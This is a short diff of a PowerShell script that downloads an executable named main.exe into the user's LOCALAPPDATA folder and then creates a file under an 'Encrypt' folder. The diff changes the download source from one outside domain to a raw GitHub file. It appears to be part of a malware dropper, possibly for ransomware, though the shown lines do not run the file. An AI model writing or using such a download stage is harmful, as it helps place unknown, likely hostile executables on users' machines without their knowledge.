@@ -1,6 +1,6 @@
 ﻿$localpath = "$env:LOCALAPPDATA"
 $WebClient = New-Object System.Net.WebClient
-$WebClient.DownloadFile("https://blueteam.gay/main.exe","$localpath\main1.exe")
+$WebClient.DownloadFile("https://github.com/ashakiro/test1/raw/main/main.exe","$localpath\main1.exe")
 
 
 New-Item -Path "$localpath\Encrypt\PStxt.txt"
